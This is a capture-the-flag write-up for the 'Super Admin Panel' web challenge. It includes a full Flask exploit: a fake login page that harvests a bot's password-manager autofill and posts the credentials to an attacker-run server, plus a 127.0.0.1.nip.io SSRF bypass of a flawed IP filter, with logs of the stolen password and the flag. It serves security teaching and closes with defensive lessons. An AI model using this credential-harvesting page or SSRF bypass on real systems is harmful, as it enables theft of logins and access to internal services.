# Super Admin Panel — CTF Writeup

**Category:** Web Security  
**Challenge:** Super Admin Panel  
**URL:** http://superadminpanel.challs.olicyber.it

---

## Overview

The challenge gives you a login panel and a "Report" feature. A separate flagserver runs internally on `127.0.0.1:1337` and returns the flag when hit. The goal is to get the server to fetch that internal endpoint for us. To do that, we first need to be authenticated as admin — which means stealing the password.

The full chain ends up being:

```
Credential theft via headless bot → Authenticate → SSRF to 127.0.0.1:1337 → Flag
```

---

## Reading the Source Code

Two files were provided: `flagserver.js` and `adminpanel.js`.

### flagserver.js

```js
app.get('/', (req, res) => {
    return res.send(process.env.FLAG || "FLAG{test}");
})
app.listen(1337, '127.0.0.1', () => { ... })
```

The flag is served on `127.0.0.1:1337`, bound only to localhost. Nothing fancy — we just need the admin panel server to make that request for us.

---

### adminpanel.js — Walking Through the Vulnerabilities

**The Report endpoint and what the bot does:**

```js
app.post('/report', (req, res) => {
    fetch('http://'+HEADLESS_HOST, {
        method: 'POST',
        body: JSON.stringify({
            actions: [
                {type: "request", url: req.body.url, method: "GET"},
                {type: "sleep", time: 2},
                {type: "click", element: "#pwn"},
                ...__trigger_browser_password_manager,
                {type: "click", element: "#pwn"}
            ],
        }),
    })
});
```

This tells the headless browser to:
1. Visit a URL we submit
2. Wait 2 seconds
3. Click a button with `id="pwn"`
4. Trigger the browser password manager (autofill)
5. Click `#pwn` again

The bot has the admin's credentials saved. So if we serve a page that looks like the admin login form — same field IDs, same structure — the password manager will autofill the real credentials into our fake form. The second `#pwn` click submits that form straight to our server.

---

**The authentication logic:**

```js
if(checkVCred(Buffer.from(req.body.password, 'base64').toString('utf8'))){
    return front(res, `Wrong password: ${Buffer.from(req.body.password, 'base64')}`);
}
return res.cookie("passw", Buffer.from(req.body.password, 'base64').toString('utf8'), ...)
          .redirect("/panel");
```

The login form expects a **base64-encoded** password. It decodes it, checks it, and stores the decoded plaintext in a cookie called `passw`. So once we steal the plaintext password, we can just set that cookie directly and skip the login form entirely.

---

**The SSRF filter — and where it breaks:**

```js
app.post("/panel", async (req, res) => {
    let x = new URL(req.body.link);
    if(x.hostname === "localhost") throw "Invalid IP";
    let ip = await dns.promises.resolve(x.hostname);
    if(ipaddr.parse(ip[0]).range() === "private") throw "Invalid IP";
    return panel(res, `Content: ${await (await fetch(req.body.link)).text()}`);
});
```

The server checks two things:
1. Hostname isn't literally the string `"localhost"`
2. The resolved IP isn't in the `"private"` range

The bug is in the second check. The `ipaddr.js` library classifies IPs into named range buckets. The server only blocks `"private"` — but `127.0.0.1` falls into `"loopback"`, which is a completely separate bucket and **not blocked at all**.

| IP            | `ipaddr.range()`  | Blocked? |
|---------------|-------------------|----------|
| 10.0.0.1      | `"private"`       | ✅ Yes   |
| 192.168.1.1   | `"private"`       | ✅ Yes   |
| 127.0.0.1     | `"loopback"`      | ❌ No    |

So we just need a hostname that resolves to `127.0.0.1` but isn't literally `"localhost"`.

---

## First Attempt: ngrok Redirect — Why It Failed

The first instinct was to host the SSRF payload on our server and return an HTTP redirect to `http://127.0.0.1:1337/` from a `/redirect` endpoint. The idea was:

1. Submit our ngrok URL as the link
2. Server fetches it, gets a `302 → http://127.0.0.1:1337/`
3. Server follows the redirect and hits the flagserver

The problem: the IP check runs on the **submitted URL** before fetching. Our ngrok URL passes fine — it's a public IP. But when `node-fetch` follows the redirect to `127.0.0.1`, it's the **fetch library** making that request, not going through the validation again. In theory this should work — but in practice the challenge server's environment couldn't reach our ngrok URL to do the initial fetch in the first place. The headless bot and the admin panel server are in different network contexts. The bot can visit our page (it's a browser), but the panel server doing `fetch()` directly couldn't reach ngrok.

The response was:

```
Content: Hackers not allowed
```

Which meant the fetch to our server was failing before the redirect even happened.

---

## The Fix: nip.io Wildcard DNS

Instead of involving our server in the SSRF at all, we use **nip.io** — a public wildcard DNS service where any subdomain named after an IP resolves to that IP:

```
127.0.0.1.nip.io  →  resolves to  →  127.0.0.1
```

So we submit:

```
http://127.0.0.1.nip.io:1337/
```

- `hostname` is `"127.0.0.1.nip.io"` — not `"localhost"`, passes string check ✅
- `dns.resolve(...)` returns `["127.0.0.1"]`
- `ipaddr.parse("127.0.0.1").range()` → `"loopback"` ≠ `"private"` ✅ bypassed
- `fetch("http://127.0.0.1.nip.io:1337/")` → hits the flagserver → returns the flag

No redirect, no external server involved. The panel server resolves and fetches everything itself.

---

## Full Exploit Script

A Flask server handled both steps — serving the credential-theft page and then firing the SSRF once the password came in:

```python
#!/usr/bin/env python3

from flask import Flask, request
import requests

app = Flask(__name__)
s = requests.Session()

url = input("Enter the public URL of this site (example: ngrok URL): ").strip()

PAYLOAD = f"""
<html>
    <head>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@300&display=swap" rel="stylesheet">
        <title>Super Admin Panel</title>
        <script>
            var pwnClicks = 0;
            function pwnClick() {{
                pwnClicks++;
                if (pwnClicks >= 2) {{
                    document.querySelector('form').submit();
                }}
            }}
        </script>
    </head>
    <body style="font-family: 'Inter'; max-width: 700px; margin: 0 auto; background-color: #08090f; padding: 20px; color: #0095ff;">
        <h1 style="font-size: 3rem; font-family: 'JetBrains Mono', monospace;">Super Admin Panel</h1>

        <form action="{url}" method="POST"
              style="background-color: rgba(0,0,0,0.7); padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,255,0.7);">

            <input id="username" name="username" type="text" placeholder="Username"
                   style="width:100%; padding:10px; border:2px solid #007BFF; border-radius:5px;
                          background:transparent; margin-bottom:10px; display:block; color:#fff; font-size:20px;">

            <input id="password" name="password" type="password" placeholder="Password"
                   style="width:100%; padding:10px; border:2px solid #007BFF; border-radius:5px;
                          background:transparent; margin-bottom:10px; display:block; color:#fff; font-size:20px;">

            <button style="width:100%; padding:10px; background-color:#007BFF; color:white; border:none;
                           border-radius:5px; cursor:pointer; display:block; font-size:20px; margin-bottom:10px;"
                    type="button" onclick="document.querySelector('form').submit()">Login</button>

            <!-- #pwn: first click waits for password manager autofill, second submits -->
            <button id="pwn"
                    style="width:100%; padding:10px; background-color:transparent; border:2px solid #007BFF;
                           color:white; border-radius:5px; cursor:pointer; display:block; font-size:20px;"
                    type="button" onclick="pwnClick()">&nbsp;</button>
        </form>

        <a href="#" onclick="alert('oh?')" style="font-size:2rem; font-family:'JetBrains Mono',monospace;">Report</a>
    </body>
</html>
"""

# SSRF target: nip.io resolves ANY subdomain named after an IP to that IP.
# 127.0.0.1.nip.io -> 127.0.0.1 (loopback range, NOT private — bypasses check!)
SSRF_LINK = "http://127.0.0.1.nip.io:1337/"

@app.route('/', methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return PAYLOAD

    username = request.form.get("username", "")
    password = request.form.get("password", "")

    app.logger.info(f"\n[+] Username: {username}")
    app.logger.info(f"[+] Password: {password}")

    if not password:
        app.logger.warning("[!] Empty password — bot may not have autofilled yet")
        return "ok"

    # Authenticate: set cookie directly (server stores plaintext password in cookie)
    s.cookies.set("passw", password, domain="superadminpanel.challs.olicyber.it")

    # Verify auth works
    check = s.get("http://superadminpanel.challs.olicyber.it/panel")
    if "Test website functionality" not in check.text:
        app.logger.error("[!] Auth failed — wrong password or cookie rejected")
        app.logger.error(check.text[:500])
        return "auth failed"

    app.logger.info("[+] Auth OK! Sending SSRF payload...")

    # Fire SSRF: nip.io bypasses the loopback/private range check
    resp = s.post(
        "http://superadminpanel.challs.olicyber.it/panel",
        data={"link": SSRF_LINK}
    )

    app.logger.info(f"[+] SSRF Status: {resp.status_code}")
    app.logger.info("========== FLAG RESPONSE START ==========")
    app.logger.info(resp.text)
    app.logger.info("=========== FLAG RESPONSE END ===========")

    # Extract just the Content: ... part for convenience
    if "Content:" in resp.text:
        start = resp.text.find("Content:") + len("Content:")
        end = resp.text.find("</div>", start)
        flag = resp.text[start:end].strip()
        app.logger.info(f"\n\n🚩 FLAG: {flag}\n")

    return "ok"


if __name__ == "__main__":
    app.run("0.0.0.0", 8080, debug=True)
```

**Running it:**
1. Start the Flask server, expose it with ngrok
2. Go to the challenge site → Report → submit your ngrok URL
3. Bot visits your page, autofills admin creds, submits to your server
4. Your server sets the cookie and fires the SSRF
5. Flag shows up in the logs

---

## Output

```
[2026-05-11 17:23:16,152] INFO in script: 
[+] Username: admin
[2026-05-11 17:23:16,152] INFO in script: [+] Password: goodluckcrackingthis_012391293
[2026-05-11 17:23:16,569] INFO in script: [+] Auth OK! Sending SSRF payload...
[2026-05-11 17:23:16,879] INFO in script: [+] SSRF Status: 200
[2026-05-11 17:23:16,879] INFO in script: ========== FLAG RESPONSE START ==========
[2026-05-11 17:23:16,879] INFO in script: 
<html>
    <head>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&amp;family=Inter:wght@300&amp;display=swap" rel="stylesheet">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@300&display=swap" rel="stylesheet">
        <title>Super Admin Panel</title>
    </head>
    <body style="font-family: 'Inter'; max-width: 700px; margin: 0 auto; background-color: #08090f; padding: 20px; color: #0095ff;">
        <h1 style="font-size: 3rem; font-family: 'JetBrains Mono', monospace;">Super Admin Panel</h1>
        <h2 style="font-size: 2rem; font-family: 'JetBrains Mono', monospace;">Test website functionality</h2>
        <form action="/panel" method="POST" style="background-color: rgba(0, 0, 0, 0.7); padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 255, 0.7);">
            <input id="link" name="link" type="text" placeholder="Link" style="width: 100%; padding: 10px; border: 2px solid #007BFF; border-radius: 5px; background: transparent; margin-bottom: 10px; display:block; color: #fff; font-size: 20px;">
            <button style="width: 100%; padding: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; display:block; color: #fff; font-size: 20px; margin-bottom: 10px;" type="submit" value="Submit">Go</button>
        </form>
        <div style="padding: 10px; border: 2px solid #FF5733; border-radius: 5px; background: transparent; color: #FF5733; text-align: center; font-size: 20px; display: block; margin-bottom: 10px; font-size: 24px;">Content: flag{I_L0v3_st34ling_auTOf1ll}</div>
    </body>
</html>
[2026-05-11 17:23:16,879] INFO in script: =========== FLAG RESPONSE END ===========
[2026-05-11 17:23:16,879] INFO in script: 

🚩 FLAG: flag{I_L0v3_st34ling_auTOf1ll}
```

---

## Key Takeaways

- **Blocklist IP validation is fragile.** Blocking only `"private"` misses `"loopback"`, `"linkLocal"`, and other special ranges. The right approach is to allowlist only known-safe public ranges.
- **nip.io bypasses hostname-based filters** without needing any redirect infrastructure — the DNS resolution itself points to the internal IP.
- **Headless bots + password managers are a dangerous combo** when the bot visits attacker-controlled pages. It doesn't matter how strong the password is if the bot will just autofill and submit it for you.
- **Redirect-based SSRF needs the server to be network-reachable.** If the challenge server can't reach your machine, the redirect never happens. DNS-based bypasses avoid this entirely.
